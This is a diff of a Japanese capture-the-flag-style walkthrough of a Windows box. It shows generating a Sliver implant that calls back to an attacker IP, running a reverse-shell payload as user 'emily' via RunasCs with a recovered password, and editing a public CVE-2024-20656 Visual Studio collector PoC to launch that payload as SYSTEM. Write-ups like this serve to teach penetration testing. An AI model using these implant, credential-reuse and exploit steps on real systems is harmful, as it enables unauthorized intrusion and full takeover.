@@ -334,7 +334,7 @@ git push
 
 少し待つと、応答が得られ、ユーザー `Richard`としてシェルを取得することができました
 
-![image-20241118220455774](screenshot/image-20241118220455774.png)
+![image-20241214001852560](screenshot/image-20241214001852560.png)
 
 # 水平展開
 
@@ -346,33 +346,31 @@ git push
 
 ## Sliver のセットアップ
 
-![image-20241118221150363](screenshot/image-20241118221150363.png)
+![image-20241214001934048](screenshot/image-20241214001934048.png)
 
 サーバー起動して、インプラントを作成します。
 
 ```
-generate --mtls 10.10.16.17 --save . --os windows
+generate --mtls 10.10.16.34 --save . --os windows
 ```
 
 インプラントをターゲットマシンにアップロードします。
 
-![image-20241118221559292](screenshot/image-20241118221559292.png)
+![image-20241214002105492](screenshot/image-20241214002105492.png)
 
 アップロードが完了するとSliverでサーバーを起動して、インプラントを実行するとシェルを操作できるようになります。
 
-![image-20241118221905508](screenshot/image-20241118221905508.png)
+![image-20241214002209179](screenshot/image-20241214002209179.png)
 
 これで楽にファイルの送受信をできるようになりました。
 
-![image-20241118231023300](screenshot/image-20241118231023300.png)
-
 Giteaがインストールされていることが分かっているのでフォルダ内を調べると `gitea.db` というデータベースファイルを見つけた。
 
-![image-20241118222705714](screenshot/image-20241118222705714.png)
+![image-20241214002256277](screenshot/image-20241214002256277.png)
 
 `gitea.db` をダウンロードします。
 
-![](screenshot/image-20240809131437059.png)
+![image-20241214002331735](screenshot/image-20241214002331735.png)
 
 ファイルを調べると sqlite3のデータベースファイルであることが分かります。
 
@@ -444,25 +442,39 @@ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
 
 ![image-20241118235540653](screenshot/image-20241118235540653.png)
 
-ポートスキャンの結果からWinRMが動いていることが分かっているのでパスワードが機能するか試します。
+このパスワードでRunasCsを使用して `emily` のシェルを取得します。
 
-![](screenshot/image-20240809153748869.png)
+msfvenomでペイロードを作成してアップロードします。
 
-ログインできるようなのでログインします。
+![image-20241214002420968](screenshot/image-20241214002420968.png)
 
-![](screenshot/image-20240809153931122.png)
+RunasCsもアップロードします。
 
-ログインに成功しました
+![image-20241214002559365](screenshot/image-20241214002559365.png)
 
-![](screenshot/image-20240809154030519.png)
+ペイロードアップロードできたらリスナーを起動してRunasCsでemilyとしてpayload.exeを実行します。このとき実行するペイロードは絶対パスで指定してあげます。
+
+```powershell
+./RunasCs.exe emily 12345678 C:\temp\payload.exe
+```
+
+emilyとしてシェルを取得することができました。
+
+![image-20241213235225934](screenshot/image-20241213235225934.png)
+
+sliverのインプラントを実行してemilyのセッションを作ります。
+
+![image-20241214003022625](screenshot/image-20241214003022625.png)
 
 user.txtを取得しました。つづいてAdministratorを目指します。
+
+![image-20241214003055425](screenshot/image-20241214003055425.png)
 
 # 特権昇格
 
 Documentsフォルダに `Visual Studio 2019` のフォルダがあります。
 
-![](screenshot/image-20240809154401397.png)
+![image-20241214003128835](screenshot/image-20241214003128835.png)
 
 ## CVE-2024-20656
 
@@ -474,7 +486,7 @@ Documentsフォルダに `Visual Studio 2019` のフォルダがあります。
 
 ### VSStandardCollectorService150とは
 
-Microsoft Visual Studioの診断ツールの一部であり、パフォーマンスの分析やデバッグのための診断データを収集するサービスで、必要なシステムリソースにアクセスするためにデフォルトで `NT AUTHORITY\SYSTEM` で実行される
+Microsoft Visual Studioの診断ツールの一部であり、パフォーマンスの分析やデバッグのための診断データを収集するサービスで、必要なシステムリソースにアクセスするためにデフォルトで `NT AUTHORITY\SYSTEM` で実行されます。
 
 ### 脆弱性の詳細
 
@@ -492,41 +504,41 @@ PoCがないか調べてみたところGitHubに以下のPoCを見つけた
 
 ソースファイルの 4行目に `VSDiagnostics.exe` のパスがあるのでターゲットマシン上のパスと同じになるように変更する
 
-```
+```c++
 WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\Team Tools\\DiagnosticsHub\\Collector\\VSDiagnostics.exe";
 ```
 
 ソースファイルの187行目の `C:\windows\system32\cmd.exe` をリバースシェルペイロードに変更する
 
+emilyのシェルを取得した際のペイロードを使います。
+
 変更前
 
-```
+```c++
 CopyFile(L"c:\\windows\\system32\\cmd.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
 ```
 
 変更後
 
-```
+```c++
 CopyFile(L"c:\\temp\\payload.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
 ```
 
-編集が完了したら構成を `Releases` に変更してビルドしてターゲットマシンにアップロードする
+編集が完了したら構成を `Releases` でビルドしてターゲットマシンにアップロードする
 
 ![](screenshot/image-20240809170955104.png)
 
-![](screenshot/image-20240809171703834.png)
+![image-20241214003205162](screenshot/image-20241214003205162.png)
 
-ペイロードを作成してアップロード
+リスナーを起動し、PoCを実行します。
 
-![](screenshot/image-20240809171825360.png)
+![image-20241214003421915](screenshot/image-20241214003421915.png)
 
-Visual Studio で編集したペイロードのパスと同じ場所に置く
+SYSTEM権限のシェルを取得することができました。
 
-![](screenshot/image-20240809171916431.png)
+![image-20241213233454769](screenshot/image-20241213233454769.png)
 
+root.txtを取得して終了です。
 
-
-
-
-
+![image-20241213233545840](screenshot/image-20241213233545840.png)
 
